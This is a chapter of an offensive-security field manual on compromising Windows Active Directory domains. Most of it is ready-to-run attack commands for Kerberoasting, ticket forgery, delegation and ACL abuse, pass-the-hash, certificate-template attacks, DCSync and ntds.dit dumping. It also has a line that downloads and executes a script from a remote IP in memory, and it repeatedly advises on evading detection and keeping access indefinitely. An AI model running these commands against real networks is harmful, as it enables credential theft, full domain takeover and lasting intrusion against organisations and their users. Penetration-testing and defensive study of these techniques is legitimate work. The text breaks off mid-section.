# Chapter 20 — Active Directory Warfare: Conquering The Domain

**VADER-RCE Field Manual**
**Prerequisite**: Chapter 19 (Living Off The Land), networking fundamentals (TCP/IP, DNS, LDAP), Windows authentication basics
**Drill**: DRILLS/20_ad_warfare/

---

## AD Architecture — The Kingdom

Active Directory is the nervous system of every enterprise. It
authenticates users, manages computers, deploys software, enforces
policy, and controls who accesses what. Compromise AD and you own
the entire organisation. Every machine. Every user. Every secret.

This is not theoretical. AD compromise is the endgame of nearly every
real-world enterprise pentest. Once you're Domain Admin, it's over.

### The Building Blocks

**Domain Controller (DC)** — The throne. A server running Active Directory
Domain Services (AD DS). Stores the AD database (ntds.dit), handles
authentication requests, replicates data to other DCs. Every domain has
at least one. Most have several for redundancy. Compromise one DC and
you can compromise them all.

**Domain** — A logical grouping of objects (users, computers, groups) that
share a common AD database and security policy. Every domain has a unique
DNS name (e.g., `corp.megacorp.local`). The domain is your primary target.

**Forest** — One or more domains that share a common schema, configuration,
and global catalog. The forest is the ULTIMATE security boundary in AD.
A forest root domain is the master — compromise it and every domain in
the forest is yours.

```
Forest: megacorp.local
├── Domain: megacorp.local (forest root)
│   ├── Domain: us.megacorp.local (child)
│   └── Domain: eu.megacorp.local (child)
└── Trust: partner.com (external trust)
```

**Trust** — A relationship between domains that allows authentication
across boundaries. Trusts can be:
- **Parent-child** — automatic, two-way transitive (us.megacorp.local trusts megacorp.local and vice versa)
- **Tree-root** — connects new trees in the same forest
- **External** — one-way or two-way to a domain outside the forest
- **Forest** — between entire forests

Trusts are the BRIDGES between kingdoms. If you can abuse a trust,
you can move from one domain to another.

**Organizational Unit (OU)** — A container for organising objects. OUs
define the administrative hierarchy:
```
corp.megacorp.local
├── OU=IT
│   ├── OU=Admins
│   └── OU=Helpdesk
├── OU=Finance
├── OU=HR
└── OU=Workstations
    ├── OU=Sydney
    └── OU=Melbourne
```

OUs matter because Group Policy Objects (GPOs) are LINKED to OUs. A
GPO linked to `OU=Workstations` applies to every computer in that OU.
If you can create or modify a GPO, you can push code to every machine
in the targeted OU.

**Group Policy Object (GPO)** — The laws of the kingdom. GPOs configure:
- Security settings (password policy, account lockout)
- Software deployment (install .msi packages on login)
- Login/logoff scripts
- Registry settings
- Firewall rules

GPOs are applied hierarchically: Local → Site → Domain → OU. The last
one wins (closest to the object). If you can edit a GPO that applies to
Domain Controllers, you own the domain.

### Kerberos — The Gatekeeper

Kerberos is the default authentication protocol in AD. Understanding it
is NON-NEGOTIABLE for AD attacks. Every Kerberos attack exploits a
specific step in the authentication flow.

The full Kerberos authentication flow:

```
1. AS-REQ: Client → KDC
   "I am george@CORP.LOCAL, give me a TGT"
   (Encrypted with hash of george's password)

2. AS-REP: KDC → Client
   "Here's your TGT (encrypted with krbtgt hash)"
   + Session key (encrypted with george's hash)

3. TGS-REQ: Client → KDC
   "Here's my TGT, give me a ticket for CIFS/fileserver.corp.local"

4. TGS-REP: KDC → Client
   "Here's your Service Ticket (encrypted with fileserver's NTLM hash)"

5. AP-REQ: Client → Service
   "Here's my Service Ticket, let me in"

6. AP-REP: Service → Client (optional)
   "Authenticated. Welcome."
```

Key players:
- **KDC** (Key Distribution Center) — runs on every DC. Two services:
  - **AS** (Authentication Service) — issues TGTs
  - **TGS** (Ticket Granting Service) — issues service tickets
- **TGT** (Ticket Granting Ticket) — your "passport." Encrypted with
  the `krbtgt` account's hash. If you have the krbtgt hash, you can
  forge any TGT. That's a Golden Ticket.
- **Service Ticket** — your "visa" for a specific service. Encrypted with
  the service account's NTLM hash. If you can crack that hash, you
  get the service account password. That's Kerberoasting.

### NTLM — The Fallback

NTLM is the older authentication protocol. Still used when:
- Kerberos isn't available (IP instead of hostname, cross-forest without trust)
- Legacy applications require it
- Network authentication over HTTP (NTLM over HTTP)

NTLM flow (simplified):
```
1. Client → Server: "I want to authenticate"
2. Server → Client: Challenge (random 8 bytes)
3. Client → Server: Response (challenge encrypted with password hash)
```

The critical detail: **the NTLM hash IS the credential.** You don't need
the plaintext password. If you have the hash, you can authenticate.
That's Pass-the-Hash. We'll get there.

---

## Enumeration — Mapping The Kingdom

Before you attack, you map. Enumeration is the most important phase.
You need to know: who has admin rights, where the trust relationships
are, which accounts have weak configurations, and what the shortest
path to Domain Admin looks like.

### BloodHound — Relationship Mapping

BloodHound is THE tool for AD enumeration. It collects relationships
between AD objects and visualises attack paths as a graph. It answers
questions like:
- "What's the shortest path from this compromised user to Domain Admin?"
- "Which computers can I reach from this machine?"
- "Who has DCSync rights?"

```powershell
# SharpHound (C# collector) — runs on a domain-joined machine
# Download from github.com/BloodHoundAD/SharpHound
.\SharpHound.exe --CollectionMethods All --Domain corp.local

# Outputs a ZIP file with JSON data
# Import into BloodHound GUI (Neo4j backend)

# Stealth options — don't bang on every machine
.\SharpHound.exe --CollectionMethods DCOnly  # Only query DCs (quieter)
.\SharpHound.exe --CollectionMethods Session,LoggedOn --ComputerFile targets.txt  # Targeted

# PowerShell alternative (noisier, easier to detect)
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain corp.local
```

BloodHound pre-built queries to run first:
1. **Find All Domain Admins** — know your targets
2. **Shortest Paths to Domain Admin** — from ANY user, the graph shows the path
3. **Find Kerberoastable Users** — SPNs on user accounts = offline crackable
4. **Find AS-REP Roastable Users** — no pre-auth required = free hash
5. **Find Computers with Unconstrained Delegation** — these cache TGTs = steal tickets
6. **Find Principals with DCSync Rights** — Replicating Directory Changes = dump all hashes

### PowerView — AD Queries From The Field

PowerView (part of PowerSploit) gives you AD enumeration functions.
Pure PowerShell. No compilation needed. Loads directly into memory.

```powershell
# Load PowerView
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/PowerView.ps1')

# Domain information
Get-Domain
Get-DomainController
Get-Forest
Get-ForestDomain

# Users
Get-DomainUser | Select samaccountname, description, memberof
Get-DomainUser -SPN  # Kerberoastable accounts
Get-DomainUser -PreauthNotRequired  # AS-REP roastable
Get-DomainUser -AdminCount  # Accounts with admin privileges (AdminSDHolder)

# Groups
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
Get-DomainGroup -Identity "Enterprise Admins" | Get-DomainGroupMember
Get-DomainGroup -AdminCount  # All privileged groups

# Computers
Get-DomainComputer | Select dnshostname, operatingsystem
Get-DomainComputer -Unconstrained  # Unconstrained delegation
Get-DomainComputer -TrustedToAuth  # Constrained delegation

# GPOs
Get-DomainGPO | Select displayname, gpcfilesyspath
Get-DomainGPO -ComputerIdentity ws01.corp.local  # GPOs applied to specific computer

# ACLs — the goldmine
Find-InterestingDomainAcl -ResolveGUIDs  # ACLs that grant interesting permissions
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs  # Who can modify DA group?

# Shares
Find-DomainShare -CheckShareAccess  # Shares you can access

# Sessions — who's logged in where
Get-NetSession -ComputerName dc01  # Sessions on DC
Find-LocalAdminAccess  # Machines where current user is local admin
```

### AD Module — The Legit Alternative

The ActiveDirectory PowerShell module ships with RSAT. It's a Microsoft
tool. Using it looks like normal admin activity.

```powershell
# Import (needs RSAT installed, or copy the DLL)
Import-Module ActiveDirectory

# Same queries, different syntax
Get-ADUser -Filter * -Properties SPN, DoesNotRequirePreAuth
Get-ADGroup "Domain Admins" -Properties Members
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADObject -Filter {ObjectClass -eq "groupPolicyContainer"} -Properties displayName
```

**Operational note**: AD module queries go through normal LDAP. PowerView
queries also use LDAP but add some SAMR/DRSR calls. The AD module is
stealthier because it's the expected tool for the job.

### ldapsearch — Low And Slow

For maximum stealth, use raw LDAP queries. No PowerShell, no .NET,
no special tools. Just standard LDAP over port 389.

```bash
# From a Linux attack box with network access to the DC
# Enumerate all users
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf

# Find Kerberoastable accounts (users with SPNs)
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Find AS-REP roastable accounts
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Find Domain Controllers
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" dNSHostName
```

Raw LDAP is just another LDAP client connecting to port 389. The DC
handles thousands of these per minute from legitimate applications.
Your queries blend in.

---

## Kerberos Attacks

This is where the real money is. Kerberos is the backbone of AD
authentication, and its design has exploitable properties that let you
move from low-privilege user to domain owner.

### Kerberoasting

**The attack**: Any authenticated domain user can request a service ticket
for any service registered with an SPN (Service Principal Name). The
service ticket is encrypted with the service account's NTLM hash.
Request the ticket, take it offline, crack the hash. If the service
account has a weak password, you now own that account.

**Why it works**: It's by design. Kerberos lets any user request a ticket
for any service. The DC doesn't check whether you intend to actually
USE the service. It just hands you the ticket. And that ticket contains
the hash you need.

```powershell
# Rubeus — the standard tool
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Rubeus with specific target
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.hash

# PowerView method
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat hashcat

# Impacket from Linux
GetUserSPNs.py corp.local/george:'P@ssword1' -dc-ip 10.0.0.1 -outputfile hashes.txt
```

Crack with hashcat:
```bash
# Kerberos 5 TGS-REP (RC4 / NTLM)
hashcat -m 13100 hashes.txt rockyou.txt --rules-file best64.rule

# Kerberos 5 TGS-REP (AES256 — slower to crack but some environments force AES)
hashcat -m 19700 hashes.txt rockyou.txt
```

**Operational notes**:
- Target accounts with SPNs that are USER accounts, not machine accounts.
  Machine accounts have random 120-character passwords. Not crackable.
- Service accounts often have weak passwords because they were set once
  and never rotated. "Summer2019!" is a real password found in prod environments.
- High-value targets: `svc_sql`, `svc_backup`, `svc_admin` — service
  accounts with admin privileges.
- Kerberoasting generates Event ID 4769 (TGS request) with encryption
  type 0x17 (RC4). AES requests (0x12) are less suspicious.

### AS-REP Roasting

**The attack**: If an account has "Do not require Kerberos preauthentication"
enabled, you can request a TGT for that account WITHOUT knowing the
password. The response (AS-REP) is encrypted with the account's hash.
Take it offline, crack it.

```powershell
# Find vulnerable accounts
Get-DomainUser -PreauthNotRequired

# Rubeus
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Targeted
.\Rubeus.exe asreproast /user:old_admin /outfile:old_admin.hash

# Impacket from Linux (don't even need valid creds for this)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -outputfile asrep_hashes.txt
```

Crack:
```bash
# Kerberos 5 AS-REP
hashcat -m 18200 asrep_hashes.txt rockyou.txt --rules-file best64.rule
```

**Why accounts have this setting**: Legacy compatibility. Some old
applications can't do Kerberos pre-auth. The admin disables it, forgets
about it, and the account sits there for years with a weak password and
no pre-auth requirement. Free hash.

### Golden Ticket

**The attack**: Forge a TGT (Ticket Granting Ticket) using the `krbtgt`
account's NTLM hash. The krbtgt hash encrypts ALL TGTs in the domain.
If you have it, you can create a TGT for ANY user — including a
non-existent user with Domain Admin privileges.

This is game over. Permanent, persistent domain compromise.

```powershell
# Step 1: Get the krbtgt hash (requires Domain Admin or DCSync rights)
# Mimikatz on DC
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt

# Step 2: Forge the Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<NTLM_HASH> /ptt

# /user: — any username (can be fake)
# /domain: — target domain
# /sid: — domain SID
# /krbtgt: — the krbtgt NTLM hash
# /ptt — pass the ticket (inject into current session)

# Impacket from Linux
ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-xxx -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

**Persistence**: The krbtgt password is only changed during specific
operations (dcpromo, manual rotation). Most organisations NEVER change
it. Your Golden Ticket is valid until they rotate krbtgt — TWICE
(because AD keeps the current and previous krbtgt hash). Could be
valid for months or years.

**Detection**: Golden Tickets can be detected by:
- TGT lifetime exceeding domain policy (default 10 hours, Golden Ticket can set any lifetime)
- Account name in ticket not matching any real account
- Missing or incorrect PAC (Privilege Attribute Certificate) validation
- Event ID 4769 for accounts that don't exist

### Silver Ticket

**The attack**: Forge a service ticket using the target SERVICE account's
NTLM hash. Doesn't touch the DC at all — you present the forged ticket
directly to the service.

```powershell
# Forge a Silver Ticket for CIFS (file shares) on dc01
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /target:dc01.corp.local /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /ptt

# Common services to target:
# CIFS — file shares
# HTTP — web services, WinRM
# MSSQL — SQL Server
# LDAP — LDAP queries (dangerous — can modify AD)
# HOST — general host access
```

**Advantage over Golden Ticket**: No contact with the DC. No AS-REQ or
TGS-REQ logged. The forged ticket goes straight to the service. Harder
to detect because there's no DC-side event.

**Limitation**: Only valid for the specific service. You need a separate
Silver Ticket for each service you want to access.

### Delegation Attacks

Kerberos delegation allows a service to act on behalf of a user. Think:
a web server accessing a database using the logged-in user's credentials.
Three types, each more restrictive, each exploitable.

**Unconstrained Delegation**: The service receives the user's full TGT and
can use it to access ANY service as that user. If a Domain Admin connects
to a machine with unconstrained delegation, their TGT is cached on that
machine. Steal it.

```powershell
# Find unconstrained delegation machines
Get-DomainComputer -Unconstrained

# If you compromise one, extract cached TGTs with Rubeus
.\Rubeus.exe triage  # List cached tickets
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt  # Dump specific TGT

# Force a DC to authenticate to your compromised machine (Printer Bug / PetitPotam)
# SpoolSample — abuse the print spooler service
.\SpoolSample.exe dc01.corp.local compromised-server.corp.local
# The DC authenticates to your machine → TGT cached → steal it → Golden Ticket path
```

**Constrained Delegation**: The service can only delegate to SPECIFIC
services listed in the `msDS-AllowedToDelegateTo` attribute. Should be
safer. Isn't.

```powershell
# Find constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# If svc_web can delegate to CIFS/fileserver:
# You can abuse S4U2Self + S4U2Proxy to get a ticket to CIFS/fileserver
# as ANY user (including Domain Admin)
.\Rubeus.exe s4u /user:svc_web /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /ptt
```

**Resource-Based Constrained Delegation (RBCD)**: The target service
controls who can delegate to it (via `msDS-AllowedToActOnBehalfOfOtherIdentity`).
If you can modify this attribute on a target, you can grant yourself
delegation rights.

```powershell
# Requirements: write access to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity
# This is common — machine account creators get this by default

# Step 1: Create a new machine account (any domain user can create up to 10 by default)
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)

# Step 2: Set RBCD on the target
Set-DomainObject -Identity target-server$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$fakeMachineSD}

# Step 3: Get a service ticket as Administrator via S4U
.\Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/target-server.corp.local /ptt
```

---

## ACL Abuse — The Most Underrated Attack Path

Misconfigured Access Control Lists are EVERYWHERE in Active Directory.
BloodHound finds them. Pentesters exploit them. Defenders rarely audit
them. These are the overlooked one-step escalation paths that turn a
help desk account into a Domain Admin.

### Understanding AD ACLs

Every AD object has a security descriptor containing a DACL (Discretionary
Access Control List). The DACL lists ACEs (Access Control Entries) — each
ACE grants or denies a specific right to a specific principal.

```
Object: CN=Domain Admins,CN=Users,DC=corp,DC=local
DACL:
  ACE 1: CORP\IT-Admins → GenericAll   (full control)
  ACE 2: CORP\Helpdesk  → AddMember    (can add members)
  ACE 3: Everyone       → Read         (can see the group exists)
```

If you're in IT-Admins, you have GenericAll on Domain Admins.
That means you can add yourself. Think about that.

### The Dangerous Permissions

**GenericAll** — Full control. On a user: reset password, modify group
membership, set SPNs (for targeted Kerberoasting). On a group: add/remove
members. On a computer: configure RBCD.

```powershell
# You have GenericAll on user john_admin
# Reset their password (doesn't require knowing the old one)
Set-DomainUserPassword -Identity john_admin -AccountPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)

# Or set an SPN for Kerberoasting
Set-DomainObject -Identity john_admin -Set @{ServicePrincipalName='http/fake'}
.\Rubeus.exe kerberoast /user:john_admin /outfile:john.hash
# Crack offline, get creds, remove the SPN
Set-DomainObject -Identity john_admin -Clear ServicePrincipalName
```

**GenericWrite** — Modify non-protected attributes. Set SPNs (targeted
Kerberoasting). Modify logon script. Set `msDS-AllowedToActOnBehalfOfOtherIdentity`
(RBCD attack).

```powershell
# GenericWrite on a computer → RBCD attack
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-xxx-FAKEMACHINE_SID)"
$bytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($bytes, 0)
Set-DomainObject -Identity target-server$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$bytes}
```

**WriteDACL** — Modify the object's ACL. Grant yourself GenericAll,
then abuse that.

```powershell
# WriteDACL on Domain Admins group
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity george -Rights All
# Now you have GenericAll on Domain Admins → add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members george
```

**WriteOwner** — Change the object's owner. The owner implicitly has
WriteDACL. Take ownership → grant yourself GenericAll → full control.

```powershell
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity george
# Now you own the group → WriteDACL is implicit → grant GenericAll → add yourself
```

**ForceChangePassword** — Reset a user's password without knowing the
current one.

```powershell
Set-DomainUserPassword -Identity target_admin -AccountPassword (ConvertTo-SecureString 'P@ss!' -AsPlainText -Force)
```

**AddMember / Self** — Add members to a group. If you have this on
Domain Admins, you add yourself directly.

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members george
```

### Finding ACL Abuse Paths

```powershell
# PowerView — find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite|ForceChangePassword"
} | Select ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# BloodHound does this automatically and visualises the paths
# Query: "Shortest Paths to Domain Admin from Owned Principals"
```

---

## Lateral Movement In AD

You have credentials (plaintext, hash, or ticket) for one account. You
need to move to another machine. Every method has a different noise level
and a different detection profile.

### Pass-the-Hash (PtH)

**The attack**: Use an NTLM hash directly to authenticate. No password
cracking needed. The hash IS the credential in NTLM authentication.

```bash
# Impacket — PtH with psexec
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@10.0.0.50

# Impacket — PtH with wmiexec (less noisy)
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@10.0.0.50

# Impacket — PtH with smbexec
smbexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@10.0.0.50

# Mimikatz — inject hash into current session
mimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
# Opens a new cmd.exe with the injected credentials
```

**Noise level**: MEDIUM. Creates service on target (psexec) or uses WMI
(wmiexec). The authentication itself is normal NTLM. The execution
method determines how loud it is.

### Pass-the-Ticket (PtT)

**The attack**: Inject a stolen Kerberos ticket into your session. The
ticket could be a TGT (gives you broad access) or a service ticket
(gives you access to one specific service).

```powershell
# Export tickets from memory
mimikatz# sekurlsa::tickets /export
# Produces .kirbi files

# Inject a ticket
mimikatz# kerberos::ptt ticket.kirbi

# Rubeus — more flexible
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Verify
klist  # Should show the imported ticket
dir \\dc01.corp.local\c$  # Test access
```

**Noise level**: LOW. Kerberos authentication is expected. No anomalous
NTLM traffic. No service creation. The ticket just needs to be valid.

### Overpass-the-Hash

**The attack**: Use an NTLM hash to request a Kerberos TGT. Convert NTLM
credentials into Kerberos credentials. Now you can use Kerberos-only
services.

```powershell
# Mimikatz
mimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:<HASH> /run:powershell.exe
# The new PowerShell session will request a Kerberos TGT using the hash

# Rubeus — more precise
.\Rubeus.exe asktgt /user:admin /rc4:<HASH> /ptt
```

**Why bother when PtH exists?** Some environments disable NTLM. Kerberos-only
networks. Overpass-the-hash lets you bridge from NTLM creds to Kerberos auth.

### PSRemoting / WinRM

```powershell
# Native PowerShell remote execution
$cred = Get-Credential  # or use injected credentials
Enter-PSSession -ComputerName target -Credential $cred

# Run a command
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami; hostname }

# Fan out — execute on multiple machines simultaneously
Invoke-Command -ComputerName server1,server2,server3 -Credential $cred -ScriptBlock { whoami }
```

**Noise level**: LOW. WinRM on port 5985/5986 is expected in managed
environments. PowerShell Remoting is a standard admin tool. The content
of the commands might be logged (PowerShell logging) but the connection
itself is normal.

### DCOM Lateral Movement

Covered in Chapter 19 (MMC20.Application, ShellWindows). DCOM
uses port 135 + dynamic RPC ports. It's expected management traffic.

### SMB — File Shares and Named Pipes

```bash
# Copy files to target via SMB
smbclient //target/C$ -U 'corp.local/admin%P@ss' -c "put payload.exe Windows\Temp\payload.exe"

# PsExec (Sysinternals) — copies a service binary, executes, removes
psexec.py corp.local/admin:'P@ss'@target cmd.exe
# How psexec works: copies binary to ADMIN$ share → creates a service → starts service → executes
# Noisy: creates a service, writes files, generates Event IDs 7045 (service installed) + 4697
```

### Noise Level Comparison

| Method | Protocol | Ports | Detection | Noise |
|--------|----------|-------|-----------|-------|
| psexec | SMB | 445 | Service creation (7045/4697) | HIGH |
| wmiexec | WMI/DCOM | 135+RPC | Process creation (4688) | MEDIUM |
| smbexec | SMB | 445 | Service creation | HIGH |
| PSRemoting | WinRM | 5985 | PS logging, network logon | LOW |
| DCOM | DCOM | 135+RPC | Process creation | MEDIUM |
| Pass-the-Ticket | Kerberos | 88, service port | Normal Kerberos | LOW |

---

## Privilege Escalation Paths

You're on a box with low privileges. You need SYSTEM or Domain Admin.
These are the escalation routes.

### Token Impersonation — Potato Attacks

Windows services often run as SYSTEM. If you can trick a SYSTEM service
into authenticating to you, you can impersonate that token. The "Potato"
family exploits different mechanisms to achieve this.

**JuicyPotato** (Windows Server 2016/2019, Win10 < 1809):
Abuses BITS/DCOM to get SYSTEM token via a rogue COM server.

**PrintSpoofer** (Win10 1809+, Server 2019):
Abuses the print spooler service. Creates a named pipe, tricks the
spooler into connecting, impersonates the connection.

```cmd
:: PrintSpoofer — from service account (e.g., IIS, MSSQL) to SYSTEM
PrintSpoofer.exe -i -c cmd.exe
:: Opens cmd as SYSTEM
```

**GodPotato** (works on most modern Windows):
Improved Potato variant. Reliable across versions.

```cmd
GodPotato.exe -cmd "cmd /c whoami"
:: Returns: nt authority\system
```

**Requirement**: You need `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
Service accounts (IIS, SQL, network service) have these by default.
That's why "webshell to SYSTEM" is a well-trodden path.

### Group Policy Abuse

If you can create or modify a GPO and link it to an OU containing your
targets, you can push code to every machine in that OU.

```powershell
# Check if you can create GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "CreateChild" }

# Check if you can link GPOs to OUs
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "WriteProperty" -and $_.ObjectAceType -match "GP-Link" }

# SharpGPOAbuse — add a scheduled task via GPO
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "CORP\admin" --Command "cmd.exe" --Arguments "/c net localgroup Administrators george /add" --GPOName "Default Domain Policy"
```

**Impact**: Every machine that processes the GPO executes your command.
If you modify the Default Domain Policy, that's EVERY machine in the
domain. Including DCs.

### AD Certificate Services (AD CS) — ESC Attacks

AD CS is Microsoft's PKI implementation. Misconfigured certificate
templates are one of the most devastating escalation paths discovered
in recent years. The "ESCn" taxonomy (ESC1 through ESC8+) classifies
different misconfigurations.

**ESC1** — Template allows requestor to specify Subject Alternative Name (SAN):
```bash
# Certipy from Linux
certipy req -u george@corp.local -p 'P@ss' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
# Requests a certificate with Administrator's UPN → authenticate as Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

**ESC4** — Vulnerable template ACLs allow modification:
```bash
# If you can modify a template, change it to be ESC1-vulnerable, then exploit
certipy template -u george@corp.local -p 'P@ss' -template VulnTemplate -save-old
# Modify template to allow SAN specification
certipy req -u george@corp.local -p 'P@ss' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
# Restore original template
certipy template -u george@corp.local -p 'P@ss' -template VulnTemplate -configuration old_config.json
```

**ESC8** — NTLM relay to AD CS web enrollment:
```bash
# Coerce DC authentication (PetitPotam, PrinterBug)
# Relay the NTLM auth to the AD CS HTTP enrollment endpoint
ntlmrelayx.py -t http://ca-server.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Get a certificate as the DC machine account → DCSync
```

**ESC11** — NTLM relay to the RPC certificate enrollment endpoint (newer variant):
```bash
certipy relay -target ca-server.corp.local -ca CORP-CA -template DomainController
```

AD CS attacks are particularly devastating because certificates are
valid for their entire lifetime (typically 1 year). Even if the password
changes, the certificate remains valid. Persistent access through PKI.

### Trust Abuse — Child To Parent

If you're Domain Admin in a CHILD domain, you can escalate to Enterprise
Admin in the PARENT domain. The SID history injection attack:

```powershell
# From child domain (us.megacorp.local) → parent (megacorp.local)
# Forge a Golden Ticket with the Enterprise Admins SID from the parent domain

mimikatz# kerberos::golden /user:Administrator /domain:us.megacorp.local /sid:S-1-5-21-CHILD-SID /krbtgt:<CHILD_KRBTGT_HASH> /sids:S-1-5-21-PARENT-SID-519 /ptt

# /sids: adds the Enterprise Admins SID (RID 519) from the parent domain to the ticket's SID history
# The parent DC sees this ticket, checks the SID history, grants Enterprise Admin access
```

This works because trusts within a forest are TRANSITIVE and SID
filtering is NOT applied within a forest by default. The forest is
the true security boundary. Domain boundaries within a forest are
administrative, not security.

---

## Domain Dominance

You have Domain Admin. Now what? Extract everything. Establish permanent
access. Own the domain so thoroughly that even if they find and fix the
initial compromise, you can walk back in.

### DCSync

**The attack**: Impersonate a Domain Controller and request password
replication. The target DC thinks you're another DC doing normal
replication and sends you every hash in the domain.

```powershell
# Mimikatz — dump specific account
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt

# Dump ALL accounts
mimikatz# lsadump::dcsync /domain:corp.local /all /csv

# Impacket from Linux
secretsdump.py corp.local/admin:'P@ss'@dc01.corp.local

# What you get:
# - NTLM hashes for every account in the domain
# - krbtgt hash (Golden Ticket)
# - Machine account hashes
# - Kerberos keys
```

**Required rights**: The account needs `Replicating Directory Changes`
and `Replicating Directory Changes All` rights on the domain object.
Domain Admins have these. So does anyone you (or an admin) specifically
granted these rights to.

**Detection**: Event ID 4662 with properties matching directory replication.
Replication from a non-DC source IP. Monitoring for anomalous use of
the DRSR (Directory Replication Service Remote) protocol.

### NTDS.dit Extraction

The ntds.dit file IS the AD database. It contains every user account,
every hash, every secret. It's locked while AD DS is running. Getting
it requires either:

```cmd
:: Method 1: Volume Shadow Copy (VSS) — no service interruption
:: Create a shadow copy of the system drive
vssadmin create shadow /for=C:

:: Copy ntds.dit from the shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

:: Also need the SYSTEM hive (contains the boot key for decryption)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

:: Extract hashes offline
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

```cmd
:: Method 2: ntdsutil — Microsoft's own AD maintenance tool
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\AD_Backup" quit quit
:: Creates a full AD backup including ntds.dit and registry hives
:: Intended for DC promotion — we're using it for hash extraction
```

```powershell
# Method 3: Invoke-NinjaCopy — reads raw disk sectors to bypass file locks
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\Temp\ntds.dit"
```

### Establishing Permanent Access

Once you have the krbtgt hash, you have the keys to the kingdom
forever (or until they rotate it twice):

1. **Golden Ticket** — forge TGTs at will, from anywhere, anytime
2. **Silver Tickets** — access specific services without touching the DC
3. **Skeleton Key** — patch LSASS on the DC to accept a master password
   for any account (mimikatz: `misc::skeleton`, password: "mimikatz")
4. **DSRM password** — Directory Services Restore Mode. A local admin
   password on every DC. Rarely changed. Access even if AD is down.
5. **AdminSDHolder** — protected object with ACLs that propagate to all
   privileged accounts every 60 minutes. Modify its ACL → your permissions
   persist even if removed from privileged groups.
6. **SID History injection** — add a privileged SID to your account's SID
   history. You get those privileges even though you're not in the group.
7. **AD CS certificates** — issue yourself a certificate as Domain Admin.
   Valid for the certificate's lifetime. Password changes don't revoke it.

### Forest Compromise — The Final Step

If the forest contains multiple domains and you own one:

```powershell
# Enumerate trusts
Get-DomainTrust
Get-ForestDomain

# Child-to-parent with SID history (covered above)
# Forest trust abuse — if SID filtering is misconfigured
# or if there's a shared admin account across forests

